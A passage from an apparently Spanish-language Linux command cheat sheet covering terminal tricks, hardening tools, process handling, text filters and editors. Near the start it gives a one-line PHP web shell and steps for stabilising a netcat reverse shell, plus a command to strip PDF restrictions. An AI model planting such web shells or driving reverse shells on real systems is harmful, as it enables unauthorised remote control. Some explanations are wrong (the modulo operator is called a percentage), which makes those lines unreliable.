alias infinitehack='cat /dev/urandom | hexdump -C | grep "ca fe"'
```
  
Desactivar limitaciones de seguridad de documento PDF:
```
gs -q -dNOPAUSE -dBATCH -sDEVICE=pdfwrite -sOutputFile=OUTPUT.pdf -c .setpdfwrite -f INPUT.pdf
```
  
Ver Star Wars en código ASCII a través de Telnet:
```
telnet towel.blinkenlights.nl
```
  
Listar los comandos más usados por el usuario actual en orden de más a menos usado:
```
history | awk '{print$2}' | sort | uniq -c | sort -rn | head
```
   
Buscar archivos con el mismo HASH MD5 desde el directorio actual:
```
find -type f -exec md5sum '{}' ';' | sort | uniq --all-repeated=separate -w 33 | cut -c 35-
```
   
Ver fecha actual con petición curl:
```
curl -sS [https://worldtimeapi.org/api/timezone/Europe/Madrid](https://worldtimeapi.org/api/timezone/Europe/Madrid) | awk 'NR==1' | awk '{print$4}' FS=":"
```
​  
Crear archivo .php para activar conexión remota desde navegador mediante shell:
```
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```
​​
###  ​🈂️ TRATAMIENTO DE LA TTY (MEJORAR UNA SHEL PRECARIA)  
   
En un entorno Linux, TTY (TeleTYpewriter) es un término que se refiere a una interfaz de texto que permite la comunicación entre el usuario y el sistema. Originalmente, los TTY eran dispositivos físicos (teletipos) que se utilizaban para interactuar con los sistemas informáticos, pero en la actualidad, el término se refiere principalmente a las terminales virtuales o consolas de texto en sistemas modernos.  
  
Cuando se habla de tratar la TTY se hace referencia a mejorar el display de la shell, o incluso de mejorar de shell (por ejemplo de una sh a una bash). A continuación, algunas formas de lograrlo cuando manejamos una shell remota que entra por un puerto dado, "escuchando" con NetCat:  
  
1️⃣ MÉTODO 1 (Más sencillo, aunque no suele funcionar. Diagnosticar tipo de terminal con echo $TERM):
```
shell  
bash
```

2️⃣ MÉTODO 2:

1º. (Inicia una sesión de bash interactiva, descartando la grabación de la sesión)
```
script /dev/null -c bash
```
  
2º. (Suspende el proceso actual en la terminal y lo envía a segundo plano)
```
[ctrl] + [Z]
```
  
3º. (Configura la terminal en modo "raw" o "crudo" y desactiva el eco, luego retoma el proceso suspendido anteriormente)  
```
stty raw -echo; fg  
zsh: suspended nc -nlvp 4444
```
  
​NOTA: Si la terminal queda en un estado inestable o falla, recuperarla con:
```
stty sane
```
o bien
```
reset
```
  
4º. (No se ve el input. Reinicia la configuración de la terminal al tipo "xterm"):
```
reset xterm
```
​  
5ª. (Establece el tipo de terminal como "xterm"):
```
export TERM=xterm
```
​  
6ª. (Establece bash como la shell predeterminada para la sesión actual):
```
export SHELL=bash
```
  
3️⃣ MÉTODO 3 (comprobar si python/python3 están presentes en el sistema con which python/which python3).

1º. (Este comando usa Python para invocar una shell interactiva):
```
python3 -c ‘import pty;pty.spawn(“/bin/bash”)’
```
  
2º. (Ejecuta una bash shell mientras suprime la grabación de log de la sesión)  
/usr/bin/script -qc /bin/bash /dev/null  
  
3º. (Establece un tipo de sesión de terminal que soporte funciones avanzadas como 256 colores):
```
export TERM=xterm-256color
```

3️⃣ MÉTODO 4 (comprobar si perl está presente en el sistema con which perl).

1º. (Estos comandos usan Perl para invocar una shell interactiva):
```
perl -e 'exec "/bin/bash";'
```
o bien
```
perl -e 'require "pty.pm"; PTY::spawn("/bin/bash");'
``` 
​  
2º. (Ejecuta una bash shell mientras suprime la grabación de log de la sesión):
```
/usr/bin/script -qc /bin/bash /dev/null
```
   
3º. (Establece un tipo de sesión de terminal que soporte funciones avanzadas como 256 colores):
```
export TERM=xterm-256color
```

### ⚠️ ZSH_HISTORY FIX  
  
ERROR por terminal:
```
zsh: corrupt history file /home/user/.zsh_history
```
  
Forzar recarga del historial (comprobación de error):
```
fc -R
```  
  
Eliminar archivo corrupto .zsh_history. Se reinicia la información guardada en dicho archivo y desaparece el error:
```
rm ~/.zsh_history
```

### ❓ COMANDOS DE AYUDA  

```
[comando] -?  
[comando] -h  
[comando] --help  
man [comando]   
tldr [comando]
```
  
⏱️ Mostrar el tiempo que tarda en ejecutarse un comando:
```
time [comando]
```

### 🔁  CONTRAMEDIDAS  
  
Reducir los permisos de /tmp a solo lectura y ejecución, de grupos y resto usuarios:
```
sudo chmod 755 /tmp
```
  
▶ CHKROOTKIT  
Programa que busca rootkits en tu sistema.  
  
Instalar:
```
sudo apt-get install chkrootkit
```
Ver parámetros:
```
man chkrootkit
```
Ejecutar:
```
sudo chkrootkit
```
  
Ejecutar versión preconfigurada, diseñada para ser ejecutada diariamente por un temporizador de systemd o como un trabajo de cron:
```
sudo chkrootkit-daily
```

El archivo de configuración se encuentra en:
```
/etc/chkrootkit/chkrootkit.conf
```
  
▶ LYNIS  
Herramienta de auditoría de seguridad que puede ayudar a identificar problemas de seguridad.  
  
Instalar:  
sudo lynis --update  
Ejecutar:  
sudo lynis audit system  
  
▶ IPTABLES  
Para comprobar que solo los servicios necesarios están expuestos a la red.  
Listar las reglas actuales y ajustarlas según sea necesario con:  
iptables -L -n -v  
  
▶ FAIL2BAN  
Herramienta que protege el sistema contra ataques de fuerza bruta bloqueando IPs que muestran comportamientos sospechosos.  
  
Instalar:  
sudo apt update  
sudo apt-get install fail2ban  
Configurar:  
sudo nano /etc/fail2ban/jail.local  
Habilitar y reiniciar Fail2Ban una vez configurado:  
sudo systemctl enable fail2ban  
sudo systemctl start fail2ban  
Verificar el estado del servicio con:  
sudo systemctl status fail2ban  
Uso de Fail2Ban-client:  
sudo fail2ban-client status sshd  
Desbloquear una dirección IP:  
sudo fail2ban-client unban [IP]  
  
▶ UFW  
Firewall fácil de usar que puede ayudarte a gestionar el tráfico de red entrante y saliente.  
  
Instalar:  
sudo apt-get install ufw  
Habilitar:  
sudo ufw enable  
Deshabilitar:  
sudo ufw disable  
Restablecer valores predeterminados:  
sudo ufw reset  
Listar reglas del firewall:  
sudo ufw status  
Permitir un servicio específico (por ejemplo ssh):  
sudo ufw allow ssh  
Deshabilitar un servicio específico (por ejemplo ssh):  
sudo ufw delete allow ssh  
Configurar reglas del firewall (ejemplo):  
sudo ufw allow 6000:6007/tcp  
sudo ufw allow 6000:6007/udp  
Configurar reglas del firewall más específicas (ejemplo):  
sudo ufw allow from 192.168.1.100 to any port 22  
  
▶RKHUNTER  
Herramienta útil para detectar rootkits.  
Instalar:  
sudo apt-get install rkhunter  
Actualizar:  
rkhunter --update  
Ejecutar escaneo del sistema:  
sudo rkhunter --check --skip-keypress  
Configurar cronjob de escaneo automático, a las 16:00 de cada lunes:  
0 16 * * 1 /usr/bin/rkhunter --check --cronjob --report-warnings-only  
  
▶ TIGER  
Herramienta para monitorear cambios en los archivos del sistema, lo cual es útil para detectar modificaciones no autorizadas.  
Instalar:  
sudo apt-get install tiger  
Ejecutar auditoria:  
sudo tiger -h   
  
▶ SNORT  
Sistema de detección de intrusiones de red.  
Instalar:  
sudo apt-get install snort  
Archivo de:  
sudo apt-get install tiger  
Ejecutar:  
sudo snort -q -c /etc/snort/snort.conf -i eth0   
  
▶ SSH HARDENING  
- Desactivar el inicio de sesión como root  
- Utilizar claves SSH en lugar de contraseñas  
- Limitar los intentos de inicio de sesión fallidos

### 🖥️ SISTEMA  
  
Identificar parámetros:  
pwd                                     (directorio actual)  
whoami                              (nombre de usuario actual)  
uname                                 (nombre de la máquina)  
uname -r                             (versión del Kernel)  
hostname                           (nombre del host)  
hostname -i                       (IP localhost)  
hostname -I                       (IP privada)  
echo $0                               (shell actual)  
tty                                         (consola actual. por defecto /dev/pts/0)  
getconf LONG_BIT          (ver si el sistema es de 32bit o de 64bit)

### lsb_release -a                   (versión del Sistema Opeativo)  
   
Información detallada:  
uname -a  
KERNEL     HOST           Versión KERNEL     DETALLES KERNEL                                                        Fecha compilación     Arquitectura             SO  
Linux          kaliSF01      6.6.15-amd64         #1 SMP PREEMPT_DYNAMIC  Kali  6.6.15-2kali1     (2024-04-09)              x86_64           GNU/Linux  
  
Últimos comandos utilizados por el usuario actual:  
history  
  
Ruta del archivo donde se almacena el historial de comandos del usuario actual (.bash_history)(.zsh_history):  
echo $HISTFILE  
  
Equivale al último argumento en consola:  
!$  
  
Ver código de estado del último comando:  
echo $?  
0               (✔️ el comando se ejecutó con éxito)  
1-255      (❌ el comando falló. El rango contempla valores específicos para cada error)  
  
Procesos del sistema:  
top                      (procesos en ejecución y consumo de recursos)  
htop                                     (top mejorado. requiere instalación)  
systemctl                                           (ver servicios del sistema)  
ps                                      (procesos en ejecución en el terminal)  
ps aux                                             (listar procesos del sistema)  
ps -faux                                          (listar procesos del sistema)  
kill [proceso]                                             ("matar" un proceso)  
du                                 (consumo de memoria de ficheros/directorios)  
[instrucción] &          (para ejecutar un proceso en segundo plano. indicar al final de la instrucción)  
fg [proceso]               (traer un proceso en segundo plano al primer plano)  
  
Activar/desactivar "Modo Encubierto" o "Modo Windows":  
kali-undercover

[

](https://sf01web.wixsite.com/mayusoeh/comandos-linux)

### 🐚 SHELL  
  
Ver la shell del usuario actual:  
echo $SHELL  
/usr/bin/zsh  
  
echo $0  
/usr/bin/zsh  
  
Salir de la shell actual (retroceder privilegios):  
exit  
  
Rutas absolutas de shells más usadas:  
/bin/sh                          (shell básica)  
/bin/bash                     (Bourne Again SHell)  
/bin/ash                        (Almquist SHell)  
/bin/dash                      (Debian almquist SHell)  
/bin/fish                      (Friendly Interactive SHell)  
/bin/zsh                       (Z SHell)  
/bin/zkh                       (Korn SHell)  
/bin/tcsh                     (Tenex C SHell)  
  
Instalar una shell:  
sudo apt install [shell]  
  
Cambiar la shell del usuario actual:  
chsh -s /bin/sh            (establecer sh)  
chsh -s /bin/bash       (establecer bash)  
chsh -s /bin/zsh          (establecer zsh)  
   
Simular una bash shell en un entorno sh sin representación visual:  
script /dev/null -c bash  
 

[

](https://sf01web.wixsite.com/mayusoeh/comandos-linux)

### 📦 INSTALAR / ACTUALIZAR  
  
Actualizar Sistema Operativo:  
sudo apt update                                 (ver paquetes de actualización disponibles y actualizar repositorios del sistema)  
sudo apt list --upgradable               (listar actualizaciones en detalle)  
sudo apt upgrade                               (iniciar actualización del sistema en Linux)  
sudo parrot-upgrade                         (iniciar actualización del sistema en Parrot)  
  
Instalar/Actualizar aplicaciones disponibles en el repositorio del sistema:  
sudo apt install [aplicación]  
  
Instalar aplicación descargada en formato .deb (Debian) o .rpm (otras distribuciones):  
sudo dpkg -i [aplicación.deb]  
sudo dpkg -i [aplicación.rpm]  
  
Desinstalar aplicaciones:  
sudo apt remove [aplicación]                      (desinstalar aplicación, pero no limpia librerías)  
sudo apt autoremove                                    (limpieza de librerías residuo que quedan después de desinstalar una aplicación)  
   
FLATPAK (herramienta asistente de instalación. aplicaciones en: [https://flathub.org](https://flathub.org/)):  
sudo apt install flatpak                                 (instalar Flatpack)  
sudo flatpak --version                                   (ver versión instalada de Flatpack)  
flatpak remote-add --if-not-exists flathub [https://flathub.org/repo/flathub.flatpakrepo](https://flathub.org/repo/flathub.flatpakrepo%C2%A0)         (instalar repositorio Flatpack)  
sudo flatpak install [aplicación]                  (instalar aplicación Flatpack con el repositorio instalado)  
sudo flatpak uninstall [aplicación]             (desinstalar aplicación Flatpack)  
sudo flatpak uninstall --unused                  (desinstalar remanentes de apliacionesn desinstaladas)  
  
SNAP (herramienta asistente de instalación. aplicaciones en: [https://snapcraft.io](https://snapcraft.io/)):  
sudo apt update                                               (ver paquetes de actualización disponibles y actualizar repositorios del sistema)  
sudo apt install snapd                                     (instalar Snap)  
sudo ln -s /var/lib/snapd/snap /snap         (para que las aplicaciones de Snap sean visibles en el menú del sistema)  
sudo systemctl restart snapd                       (reiniciar servicio Snap)  
sudo systemctl status snapd                        (ver estado del servicio Snap, si se encuentra o no activo)  
sudo systemctl start snapd                           (iniciar servicio Snap si no se encuentra en ejecución)  
sudo snap install [aplicación] -- classic      (instalar aplicaciones por nombre)  
sudo snap list                                                     (ver listado de aplicaciones instaladas de Snap)  
sudo snap remove [aplicación]                     (desinstalar aplicación de Snap)  
 

[

](https://sf01web.wixsite.com/mayusoeh/comandos-linux)

### 📀 PROCESOS DEL SISTEMA  
  
Ejecutando una aplicación se bloqueará la shell (1er plano). Ejemplo con Firefox:  
firefox  
   
Detener proceso en ejecución (en primer plano):  
[ctrl] + [z]  
  
Restaurar proceso detenido:  
bg  
   
Cerrar proceso en ejecución (1er plano):  
[ctrl] + [c]  
  
Ejecutar aplicación (en 2do plano) sin bloquear la shell, mostrando la actividad por consola. Ejemplo con Firefox:  
firefox &  
  
Ejecutar aplicación (en 2do plano) sin bloquear la shell, ocultando la actividad por consola. Ejemplo con Firefox:  
firefox &> /dev/null & disown  
  
Para ver los procesos en ejecución en 2do plano, iniciados desde la terminal actual:  
jobs  
  
Para escalar un proceso corriendo en 2do plano, a 1er plano:  
fg  
  
Para escalar un proceso corriendo en 2do plano, a 1er plano, especificando el proceso por su orden de aparición:  
fg %[número]  
  
Mostrar el PID (Process ID) de un proceso en ejecución:  
pgrep firefox  
  
Matar proceso/s en ejecución:  
kill %  
  
Matar proceso/s en ejecución de forma forzosa evitando  
ejecuciones secundarias del programa en ejecución:  
kill -9 [número]  
  
Matar un proceso en ejecución por su PID (Process ID):  
kill [PID]  
  
Matar un proceso en ejecución por nombre:  
killall [nombre_proceso]  
  
Mostrar TODOS los procesos del sistema:  
ps aux  
  
Buscar un proceso (ejemplo con Firefox) entre todos los procesos del sistema:  
ps aux | grep firefox

[

](https://sf01web.wixsite.com/mayusoeh/comandos-linux)

### Parar proceso en ejecución:  
ctrl + c  
Pasarlo a segundo plano para liberar la shell:  
ctrl + z  
Matar proceso en ejecución:  
kill % 

###  📋 GETENT  
  
El comando getent en Linux se utiliza para obtener entradas de bases de datos. Este comando puede consultar diferentes tipos de bases de datos, como las de usuarios, grupos, contraseñas, hosts, servicios y más, que están configuradas en el sistema.  
  
USOS COMUNES:  
getent passwd                                 (Listar todos los usuarios del sistema)  
getent group                                     (Listar todos los grupos del sistema)  
getent hosts                                     (Listar todos los hosts del sistema)  
getent services                                 (Listar todos los servicios del sistema)  
getent passwd [usuario]               (Obtener la información de un usuario concreto)  
getent group [grupo]                     (Obtener la información de un grupo concreto)  
 

[

](https://sf01web.wixsite.com/mayusoeh/comandos-linux)

###  ⏲️ TAREAS CRON  
  
Las tareas programadas se encuentran en:  
/etc/cron.d  
  
Listar todas las tareas programadas para el usuario actual:  
crontab -l  
  
Valores no numéricos:  
 *        (todos los valores posibles)  
 ,        (separador de valores 1,2,3)  
 -        (intervalo de valores 0-6)  
 ?       (sin valore específico)  
*/       (cada X)  
  
  
🌐 [Crontab Expression Editor](https://www.site24x7.com/tools/crontab/cron-generator.html)

![crontabs.jpg](https://static.wixstatic.com/media/afa158_cc8f4feeb8e341a480972979dc396d5b~mv2.jpg/v1/fill/w_568,h_269,al_c,q_80,usm_0.66_1.00_0.01,enc_avif,quality_auto/crontabs.jpg)

[

](https://sf01web.wixsite.com/mayusoeh/comandos-linux)

### ✏️ EDICIÓN DE OUTPUT  
  
En un entorno de terminal o consola, "output" se refiere a la salida de información generada por comandos o programas ejecutados en la terminal. Esta salida puede incluir resultados de comandos, mensajes de error, registros de actividades, entre otros. Los comandos en Linux producen salida que puede ser vista directamente en la terminal o redirigida a archivos para su posterior análisis o registro. La gestión de esta salida es crucial para la depuración, el monitoreo del sistema y la automatización de tareas.  
  
Para modificar un output en cascada, de izquierda a derecha, se puede ir filtrando mediante comandos, delimitados por pipes (|).  
  
SINTAXIS:  
[comando] | [comando] | [comando]  
  
EJEMPLO:  
Aplicando esta estructura, filtraremos el output que genera el comando ifconfig, para mostrar primero solo la segunda línea, y finalmente solo la IP privada contenida en el segundo argumento de la segunda línea.  
  
ifconfig eth0  
eth0:  flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500  
            inet 192.168.1.85  netmask 255.255.255.0  broadcast 192.168.1.255  
            inet6 fe80::a00:27ff:fe19:5c4d  prefixlen 64  scopeid 0x20<link>  
            ether 08:00:27:19:5c:4d  txqueuelen 1000  (Ethernet)  
            RX packets 21407  bytes 1611537 (1.5 MiB)  
            RX errors 0  dropped 801  overruns 0  frame 0  
            TX packets 7278  bytes 733776 (716.5 KiB)  
            TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0  
  
ifconfig eth0 | awk 'NR==2'  
inet 192.168.1.85  netmask 255.255.255.0  broadcast 192.168.1.255  
  
ifconfig eth0 | awk 'NR==2' | awk '{print$2}'  
192.168.1.85

[

](https://sf01web.wixsite.com/mayusoeh/comandos-linux)

### 🔽 STDIN (0)  
  
En Linux, STDIN (Standard Input) es el flujo de entrada estándar que acepta texto como su entrada. Este concepto es fundamental para entender cómo los comandos y programas interactúan con la entrada del usuario o con otros programas en un entorno de terminal o script.  
  
Algunos puntos clave sobre stdin:  
  
◻️ Flujo de datos: stdin es uno de los tres flujos de datos estándar en Linux, junto con stdout (standard output) y stderr (standard error). Estos flujos permiten la transferencia de datos entre comandos y programas, así como entre diferentes partes de un programa.  
  
◻️ Redirección de entrada: Puedes redirigir la entrada de un comando desde un archivo, otro comando o directamente desde el teclado utilizando el operador <. Esto es útil para automatizar tareas o para proporcionar datos a un programa sin necesidad de interacción manual.  
  
◻️ Implementación: En términos de implementación, stdin es un manejador de archivos (FILE) en C, que se conecta automáticamente al 'archivo' de entrada estándar, típicamente el archivo 1 según el sistema operativo. Este manejador se utiliza para leer datos de entrada, y no tiene un valor significativo como un puntero o un entero; solo se utiliza para leer datos de entrada.  
  
◻️ Uso en scripts y programas: En scripts de shell o programas escritos en lenguajes como C o Python, puedes utilizar stdin para leer datos de entrada. Por ejemplo, en C, puedes usar funciones como fgets() para leer líneas de texto de stdin. En Python, puedes usar input() para leer una línea de texto de stdin.  
  
◻️ Detección de lectura de stdin: No existe una forma concreta de determinar si un programa lee de stdin sin intentarlo. Una forma común es probar redirigiendo la entrada del programa o revisando la documentación del programa (manual con man) para ver si menciona la posibilidad de leer desde stdin.  
 

[

](https://sf01web.wixsite.com/mayusoeh/comandos-linux)

### 🔼 STDOUT (1)  
  
En Linux, STDOUT (Standard Output) es el flujo de salida estándar de un proceso. Es la forma en que los programas envían información normalmente al usuario o a otros programas. Por ejemplo, cuando ejecutas un comando en la terminal, la salida del comando se muestra en la pantalla, lo cual es una forma de STDOUT. STDOUT puede ser redirigido a diferentes destinos, como archivos, otros programas o incluso ignorado, utilizando operadores de redirección como > para sobrescribir un archivo con la salida, >> para agregar a un archivo sin eliminar su contenido, y &> para redirigir tanto STDOUT como STDERR a un mismo destino.  
  
STDOUT se representa con el número 1 y se utiliza para la salida normal de un programa. Por ejemplo, cuando ejecutas un comando como ls, la lista de archivos y directorios es enviada a STDOUT.  
  
STDIN (Standard Input) es el flujo de entrada estándar, representado por el número 0, que se utiliza para recibir datos de entrada desde el usuario o de otros programas. Por ejemplo, cuando presionas Enter después de escribir un comando en la terminal, esa entrada se convierte en STDIN para el comando.  
  
STDERR (Standard Error) es el flujo de salida de error, representado por el número 2, que se utiliza para enviar mensajes de error o advertencias. A diferencia de STDOUT, STDERR no se mezcla con la salida normal del programa, lo que permite separar claramente los mensajes de error de la salida normal.  
  
Los flujos de datos pueden ser visualizados en el directorio /dev con el comando ls -l /dev/std*, donde /dev/stdout es un enlace simbólico a /proc/self/fd/1, representando STDOUT. Este enfoque permite a los programadores y usuarios manipular fácilmente la entrada y salida de datos en Linux.  
  
Además, Linux ofrece flexibilidad en la redirección de estos flujos de datos. Por ejemplo, puedes redirigir la salida de un comando a otro comando utilizando el operador |, o redirigir la salida de error a /dev/null para ignorarla. Esto es útil para filtrar la salida de comandos, especialmente en scripts y automatizaciones.  
 

[

](https://sf01web.wixsite.com/mayusoeh/comandos-linux)

### ❌ STDERR (2)  
 

En Linux, stderr (Standard Error) es uno de los tres flujos de datos principales que se utilizan en la línea de comandos y en la programación. Los otros dos son stdin (entrada estándar) y stdout (salida estándar). Cada uno de estos flujos tiene un propósito específico y un descriptor de archivo asociado:

stdin (ID de flujo 0): Es la fuente de datos de entrada, generalmente el teclado.  
stdout (ID de flujo 1): Es el resultado del comando, por defecto se muestra en la pantalla.  
stderr (ID de flujo 2): Es el canal por el que se envían mensajes de error. Aunque por defecto también se muestra en la pantalla, se diferencia de stdout para permitir una manipulación separada de los mensajes de error.  
El error estándar (stderr) se utiliza para enviar mensajes de error durante la ejecución de programas. A diferencia de stdout, que se utiliza para la salida normal de los programas, stderr se destina específicamente a errores. Esto permite una distinción clara entre la salida normal y los errores, lo cual es útil para la depuración y el manejo de errores en scripts y programas.

En términos de programación, especialmente en C y C++, stderr se puede utilizar para imprimir mensajes de error directamente en la consola sin mezclarlos con la salida normal del programa. Por ejemplo, en C, puedes usar fprintf(stderr, "Mensaje de error: %s\n", mensaje); para imprimir un mensaje de error en stderr. Esto es útil para proporcionar retroalimentación detallada sobre los errores que ocurran durante la ejecución de un programa, permitiendo a los desarrolladores identificar y solucionar problemas más fácilmente.

Además, en Linux, puedes redirigir stderr a un archivo o a otro programa utilizando la sintaxis de redirección de la línea de comandos. Por ejemplo, comando 2> archivo_error.txt redirige todos los mensajes de error a archivo_error.txt, mientras que comando 2>&1 redirige tanto stderr como stdout al mismo archivo o dispositivo de salida especificado

En resumen, stderr es un componente crucial en la gestión de errores en Linux y en la programación, permitiendo una separación clara entre la salida normal y los mensajes de error, facilitando así la depuración y el manejo de errores en scripts y programas.

​

[

](https://sf01web.wixsite.com/mayusoeh/comandos-linux)

### 🗑️ /DEV/NULL  
  
En Linux, /dev/null es un dispositivo virtual con la propiedad especial de que cualquier dato escrito en él desaparece o se pierde. Por esta característica, también se le llama bitbucket o agujero negro. Se utiliza comúnmente para descartar salida y errores, lo que hace que la ejecución de comandos sea más limpia. También puede emplearse para la eliminación segura de archivos y la limpieza de archivos de registro. Al entender su funcionalidad, se permite una operación eficiente en la línea de comandos en Linux.  
  
&>/dev/null                          (redirige TODO el output a /dev/null)  
0>/dev/null                          (redirige la entrada estándar (​🔽STDIN) a /dev/null)  
1>/dev/null                          (redirige la salida estándar (🔼STDOUT) a /dev/null)  
2>/dev/null                          (redirige la salida de error estándar (❌STDERR) a /dev/null)  
 

[

](https://sf01web.wixsite.com/mayusoeh/comandos-linux)

### ▶️ ECHO y PRINTF  
  
echo hola                                           (crear output "hola")  
echo "\n hola"                                  (crear output "hola" con un salto de línea previo)  
echo hola  > [archivo]                     (guarda output "hola" en archivo "file")  
echo ¿que tal? >> [archivo]          (guarda output nuevo a archivo "file")  
  
printf hola                                         (crear output "hola")  
printf "\n hola"                                (crear output "hola" con un salto de línea previo)  
printf hola  > [archivo]                   (guarda output "hola" en archivo "file")  
printf ¿que tal? >> [archivo]        (guarda output nuevo a archivo "file")  
 

[

](https://sf01web.wixsite.com/mayusoeh/comandos-linux)

### 🔎  GREP  
  
El comando grep en Linux es una herramienta poderosa y versátil utilizada para buscar patrones de texto dentro de archivos o en la entrada estándar de la terminal. Cuando encuentra una coincidencia, imprime las líneas que contienen ese patrón. Esto lo hace especialmente útil para administradores de sistemas y desarrolladores, quienes pueden usar grep para buscar entradas específicas en archivos de registro, localizar variables y funciones dentro de bases de código, y detectar problemas relacionados con el sistema.  
  
Filtrar output con GREP después de una | (pipe):  
[cadena de comandos] | grep [termino a buscar]            (filtra un output buscando el término dado)  
   
Posibles usos:  
[output] | grep "hola cara cola"                                     (buscar una secuencia de varias palabras entrecomillándolas)  
[output] | grep -A 2 "hola"                                              (filtrar a partir de "hola" + 2 líneas adicionales a partir de la línea que contiene "hola")  
[output] | grep hola *                                                         (buscar el término "hola" en todos los archivos del directorio actual)  
[output] | grep -s hola *                                                    (si el anterior tira error al haber directorios. -s para obviarlos)  
[output] | grep hola /etc/passwd                                  (buscar el término "hola" en el archivo de la ruta indicada)  
[output] | grep -v hola [archivo]                                     (mostrar todas las líneas MENOS las que contengan "hola" en el archivo indicado)  
[output] | grep -E 'hola|hello' /etc/passwd                (buscar dos o más términos en el archivo de la ruta indicada)  
 

[

](https://sf01web.wixsite.com/mayusoeh/comandos-linux)

###  ✂️ AWK  
  
Imprimir el X argumento usando AWK:  
[output] | awk 'NR==2' | awk '{print$X}' FS=":"  
  
∎ definir nº de línea  
∎ definir nº de argumento  
∎ delimitador (divide argumentos a partir de ":" u otro caracter que se le indique)  
  
_____________________________________________________________________________________________  
   
EJEMPLO sin delimitador. 5º argumento:  
echo "hola esto es una prueba" | awk '{print$5}'  
prueba  
  
EJEMPLO con delimitador. 2º argumento:  
echo "10 20 : 30 40 : 50 60" | awk '{print$2}' FS=":"  
30 40  
 

[

](https://sf01web.wixsite.com/mayusoeh/comandos-linux)

###  ✂️ CUT  
  
Imprimir el X argumento usando CUT:  
[output] | cut -d ':' -fX   
  
∎ definir nº de argumento  
∎ delimitador (divide argumentos a partir de ":" u otro caracter que se le indique)  
  
_____________________________________________________________________________________________  
  
EJEMPLO con delimitador. 2º argumento delimitado por espacios:  
echo "hola esto es una prueba" | cut  -d ' ' -f2  
esto  
  
EJEMPLO con delimitador. 2º argumento delimitado por dos puntos:  
echo "10 20 : 30 40 : 50 60" | cut  -d ':' -f2  
30 40

[

](https://sf01web.wixsite.com/mayusoeh/comandos-linux)

[

](https://sf01web.wixsite.com/mayusoeh/comandos-linux)

###  🔀 SED  
  
El comando sed (Stream EDitor) en Linux es una herramienta poderosa y versátil utilizada para manipular texto en archivos. Su principal función es buscar y reemplazar texto dentro de archivos, pero también puede insertar, eliminar y modificar texto de manera eficiente. sed opera línea por línea, procesando cada línea de un archivo según las instrucciones dadas, y luego produce una salida que puede ser redirigida a otro archivo o mostrada en la terminal.  
  
EJEMPLO. Reemplazar todas las palabras "uno" del output, por la palabra "tres":  
echo "si hay uno, hay uno, y no cuatro" | sed 's/uno/tres/g'  
si hay tres, hay tres, y no cuatro  
  
EJEMPLO. Reemplazar todas las palabras "unix" del archivo dado, por la palabra "linux":  
sed 's/unix/linux/g' [archivo]  
  
PARÁMETROS:  
-e        (Permite ejecutar uno o varios scripts sed)  
-f        (Permite cargar el script sed desde un archivo)  
-n       (Evita que sed imprima automáticamente cada línea de salida)  
-i         (Edita archivos en su lugar, es decir, modifica el archivo original)  
-u       (No utiliza ningún buffer de datos, lo que puede ser útil para manejar archivos muy grandes)  
-s       (Trata múltiples archivos como un solo flujo de datos, en lugar de procesar cada archivo por separado)  
-r        (Acepta expresiones regulares extendidas, útil con versiones de sed que no soportan expresiones regulares extendidas por defecto)  
 

### 💬 TR  
  
EJEMPLO. Convertir mayúsculas en minúsculas:  
echo "HELLO" | tr '[:upper:]' '[:lower:]'  
hello  
  
EJEMPLO. Eliminar espacios:  
echo "hi you" | tr -s ' '  
hiyou  
  
EJEMPLO. Convertir el caracter "e" en caracter "a":  
echo "hello" | tr 'e' 'a'  
hallo  
  
EJEMPLO. Realizar un ROT13:  
echo sverjnyy | tr 'A-Za-z' 'N-ZA-Mn-za-m'  
firewall

[

](https://sf01web.wixsite.com/mayusoeh/comandos-linux)

### ➗ CÁLCULO  
  
Binario para el cálculo:  
expr  
  
Ejemplo de formulación. valores separados por espacios:  
expr 2 + 2  
4  
  
Operadores matemáticos:  
 +                  (suma)  
 -                   (resta)  
 *                   (multiplicación)  
 /                  (división)  
**                  (exponencial)  
%                  (módulo)  
   
EJEMPLOS:  
echo $((3+2))                    (suma = 5)  
echo $((3-2))                     (resta = 1)  
echo $((3*2))                     (multiplicación = 6)  
echo $((2/2))                     (división = 1)  
echo $((2**3))                    (exponencial. 2 elevado a 3 = 8)  
echo $((50%20))               (porcentaje. 50% de 20 = 10)

[

](https://sf01web.wixsite.com/mayusoeh/comandos-linux)

### 📝 EDITORES DE TEXTO  
  
Mousepad    (ventana)  
nano               (consola)  
vi                      (consola)  
vim                  (consola)

[

](https://sf01web.wixsite.com/mayusoeh/comandos-linux)

### 📝 MOUSEPAD  
 

![mousepad.png](https://static.wixstatic.com/media/afa158_0fc3996d621b4494bdcd6b4ca6b029b9~mv2.png/v1/fill/w_660,h_312,al_c,q_85,usm_0.66_1.00_0.01,enc_avif,quality_auto/mousepad.png)

[

](https://sf01web.wixsite.com/mayusoeh/comandos-linux)

### 📝 NANO  
  
[←] [↑] [→] [↓]                (mover cursor)  
[ctrl] + [x]                         (salir) ❌  
[ctrl] + [g]                         (ayuda) ❓  
[ctrl] + [o]                         (guardar) 💾  
[ctrl] + [c]                         (cancelar acción) 📛  
[alt] + [6]                          (copiar toda la línea) ✏️  
[alt] + [a] / [alt] + [6]       (marcar el texto desde alt + a y terminar de copiar con alt + 6) ✏️  
[ctrl] + [k]                         (cortar toda la línea) ✂️  
[alt] + [a] / [ctrl] + [k]      (marcar el texto desde alt + a y terminar de cortar con ctrl + k) ✂️  
[ctrl] + [u]                         (pegar el texto copiado / cortado)   
[ctrl] + [w]                        (buscar) 🔎  
[ctrl] + [y]                         (ir a página anterior) ◀️  
[ctrl] + [v]                         (ir a página siguiente) ▶️  
[ctrl] + [u]                         (deshacer) ⏮️  
[ctrl] + [e]                         (rehacer) ⏭️  
[ctrl] + [r]                          (insertar un archivo en el actual) 📄  
[ctrl] + [nº]                         (ir a un número de línea concreto) 📑  
[ctrl] + [j]                          (justificar párrafo actual) ➖

[

](https://sf01web.wixsite.com/mayusoeh/comandos-linux)

### 📝 VIM  
  
Cambiar modos  
[i]                 (activar modo escribir) ✏️  
[esc]            (activar modo navegar) 👁️  
  
En Modo Navegar  
[←] [↑] [→] [↓]          (mover cursor)  
[u]                                  (deshacer última acción) ◀️  
[g]                                  (ir al final del texto) ⏩  
[0]                                  (ir al principio del texto) ⏪  
[$]                                  (ir al final de la línea) ▶️  
[w]                                 (saltar palabra)  
[y]                                  (copiar lo seleccionado) 🔗  
[p]                                 (pegar lo copiado) 🔗  
[o]                                 (crear nueva línea)   
gg                                  (ir a primera línea)  
23g                               (ir a línea 23)  
